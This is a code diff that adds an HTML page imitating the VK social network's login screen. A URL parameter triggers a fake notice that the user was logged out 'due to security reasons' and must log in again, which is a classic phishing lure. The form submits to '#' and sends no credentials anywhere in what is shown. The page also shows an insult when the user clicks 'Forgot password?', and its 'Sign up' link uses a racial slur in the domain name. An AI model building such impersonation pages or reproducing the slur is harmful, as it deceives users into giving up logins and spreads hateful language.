@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VK - Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #4a76a8;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #4a76a8;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        input[type="submit"]:hover {
+            background-color: #3b5b8c;
+        }
+        .link {
+            display: block;
+            margin-top: 10px;
+            color: #4a76a8;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .warning {
+            color: red;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>VK - Login</h1>
+        <div class="warning" id="forgotPassword">Then remember it you fat monkey</div>
+        <div class="warning" id="securityMessage">You have been logged out due to security reasons. Please relogin to continue</div>
+        <form action="#" method="post">
+            <input type="text" placeholder="Phone number or email" required>
+            <input type="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+        <a href="?forgotPassword" class="link">Forgot password?</a>
+        <a href="https://nigger-sex.xyz/preppy" class="link">Sign up</a>
+    </div>
+
+    <script>
+        function checkWarnings() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('warSecurity')) {
+                document.getElementById('securityMessage').style.display = 'block';
+            }
+            if (urlParams.has('forgotPassword')) {
+                document.getElementById('forgotPassword').style.display = 'block';
+            }
+        }
+        checkWarnings();
+    </script>
+</body>
+</html>
+
